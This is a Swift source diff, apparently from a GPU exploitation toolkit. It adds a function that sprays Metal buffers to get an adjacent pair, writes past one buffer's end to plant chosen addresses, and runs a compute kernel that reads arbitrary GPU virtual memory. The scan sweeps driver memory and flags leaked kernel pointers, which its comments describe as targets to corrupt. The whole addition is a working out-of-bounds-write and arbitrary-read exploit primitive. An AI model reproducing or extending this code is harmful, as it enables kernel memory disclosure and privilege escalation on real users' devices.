@@ -3920,6 +3920,130 @@ func runDenseMapAndWrite(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// ── runFineVAScan ─────────────────────────────────────────────────────────────
+// High-resolution sweep of the Metal runtime GPU VA region to find all driver
+// structures.  Previous scans used 4KB step — this uses 512-byte step across
+// three sub-ranges to expose everything between known hits:
+//   Gap1:  0x1500007000 – 0x1500088000  (~512KB, 512B step → 1022 probes)
+//   Gap2:  0x1500088000 – 0x1500200000  (~1.5MB, 512B step → 3072 probes)
+//   Extra: 0x1500200000 – 0x1500400000  (2MB,    4KB step  → 512 probes)
+// For every non-zero hit: log VA, first qword, classify as:
+//   kernel ptr  (0xfffffe…) — direct kernel pointer we can corrupt
+//   GPU ptr     (0x14xx/0x15xx) — Metal driver pointer
+//   data        (anything else) — field, counter, descriptor word
+// ─────────────────────────────────────────────────────────────────────────────
+func runFineVAScan(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── Fine VA Scan ──")
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+
+        let BUF_LEN  = 4096
+        let NTHREADS = 64
+
+        // Spray to get lo/hi adjacent pair
+        var sprayBufs: [MTLBuffer] = []
+        var lo: MTLBuffer!
+        var hi: MTLBuffer!
+        for _ in 0..<64 {
+            guard let b = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = sprayBufs.last, prev.gpuAddress + UInt64(BUF_LEN) == b.gpuAddress {
+                lo = prev; hi = b
+            }
+            sprayBufs.append(b)
+        }
+        guard lo != nil, hi != nil else { step("✗ spray failed"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress,radix:16))")
+
+        let multiScanSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void multiScan(device Probe* probes [[buffer(0)]],
+                              device ulong* out    [[buffer(1)]],
+                              uint tid [[thread_position_in_grid]]) {
+            out[tid] = probes[tid].buf[0];
+        }
+        """
+        guard let lib  = try? device.makeLibrary(source: multiScanSrc, options: nil),
+              let fn   = lib.makeFunction(name: "multiScan"),
+              let rPso = try? device.makeComputePipelineState(function: fn) else {
+            step("✗ PSO failed"); completion(); return
+        }
+        step("✓ multiScan PSO ready")
+
+        func oobWriteVA(_ idx: Int, _ va: UInt64) {
+            let ptr = lo.contents().assumingMemoryBound(to: UInt64.self)
+            ptr[BUF_LEN/8 + idx * 2] = va
+        }
+
+        // Dispatch 64 probes, return (VA, val) pairs with val != 0
+        func scanChunk(_ bases: [UInt64]) -> [(UInt64, UInt64)] {
+            guard let outBuf = device.makeBuffer(length: NTHREADS * 8, options: .storageModeShared) else { return [] }
+            let outPtr = outBuf.contents().assumingMemoryBound(to: UInt64.self)
+            for i in 0..<NTHREADS { outPtr[i] = 0 }
+            for (i, va) in bases.enumerated() { if i < NTHREADS { oobWriteVA(i, va) } }
+            guard let q   = device.makeCommandQueue(),
+                  let cb  = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return [] }
+            enc.setComputePipelineState(rPso)
+            enc.setBuffer(hi,    offset: 0, index: 0)
+            enc.setBuffer(outBuf,offset: 0, index: 1)
+            let n = min(bases.count, NTHREADS)
+            enc.dispatchThreads(MTLSize(width: n, height: 1, depth: 1),
+                                threadsPerThreadgroup: MTLSize(width: min(n, rPso.maxTotalThreadsPerThreadgroup), height: 1, depth: 1))
+            enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+            var hits: [(UInt64, UInt64)] = []
+            for i in 0..<n {
+                let val = outPtr[i]
+                if val != 0 { hits.append((bases[i], val)) }
+            }
+            return hits
+        }
+
+        func classify(_ va: UInt64, _ val: UInt64) -> String {
+            switch val >> 32 {
+            case 0xFFFFFF00...0xFFFFFFFF: return "★★ KERNEL PTR"
+            case 0x14000000...0x15FFFFFF: return "★  GPU PTR"
+            default:                      return "   data"
+            }
+        }
+
+        // Build probe ranges
+        struct ScanRange { let name: String; let start: UInt64; let end: UInt64; let step: UInt64 }
+        let ranges: [ScanRange] = [
+            ScanRange(name: "gap1 7K–88K",    start: 0x1500007000, end: 0x1500088000, step: 0x200),
+            ScanRange(name: "gap2 88K–200K",  start: 0x1500088000, end: 0x1500200000, step: 0x200),
+            ScanRange(name: "extra 200K–400K",start: 0x1500200000, end: 0x1500400000, step: 0x1000),
+        ]
+
+        var totalHits = 0
+        for range in ranges {
+            step("── scan: \(range.name) step=0x\(String(range.step,radix:16)) ──")
+            var va = range.start
+            while va < range.end {
+                var batch: [UInt64] = []
+                while batch.count < NTHREADS && va < range.end {
+                    batch.append(va)
+                    va += range.step
+                }
+                let hits = scanChunk(batch)
+                for (hitVA, val) in hits {
+                    let tag = classify(hitVA, val)
+                    step("  \(tag) VA=0x\(String(hitVA,radix:16)) val=0x\(String(val,radix:16))")
+                    totalHits += 1
+                }
+            }
+        }
+
+        step("── Fine VA Scan complete: \(totalHits) hits ──")
+        step("  ★★ KERNEL PTR = direct kernel VA in GPU-readable region")
+        step("  ★  GPU PTR    = Metal driver pointer (follow with struct dump)")
+        step("  data           = descriptor field, counter, or opaque word")
+        completion()
+    }
+}
+
 // ── runRingBufDump ────────────────────────────────────────────────────────────
 // Full 4KB dump of the two writable driver VAs (hit0=0x1500006000, hit1=0x1500007000).
 // Phase 1: snapshot both pages BEFORE any GPU work (512 qwords each).
